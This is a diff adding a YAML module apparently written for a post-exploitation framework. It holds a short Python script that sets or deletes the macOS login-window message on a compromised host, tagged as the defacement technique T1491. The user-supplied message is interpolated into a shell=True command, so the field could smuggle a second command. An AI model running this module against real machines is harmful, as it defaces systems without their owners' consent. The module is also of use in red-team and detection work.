@@ -1,0 +1,51 @@
+name: Change Login Message for the user.
+authors:
+  - '@424f424f'
+description: Change the login message for the user.
+software: ''
+techniques:
+  - T1491
+background: false
+output_extension: ''
+needs_admin: true
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments:
+  - ''
+options:
+  - name: Agent
+    description: Agent to run on.
+    required: true
+    value: ''
+  - name: Message
+    description: Message to display
+    required: false
+    value: ''
+  - name: Remove
+    description: True/False to remove login message.
+    required: true
+    value: 'False'
+script: |
+  import subprocess
+  remove = {{ Remove }}
+  try:
+
+      if remove == True:
+          cmd = \"""defaults delete /Library/Preferences/com.apple.loginwindow LoginwindowText""\"
+          process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+          print("Login message removed")
+
+
+      elif remove == False:
+          cmd = \"""defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText '{{ Message }}' ""\"
+          process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+          print("Login message added")
+
+      else:
+          print("Invalid options")
+
+  except Exception as e:
+      print("Module failed")
+      print(e)
+
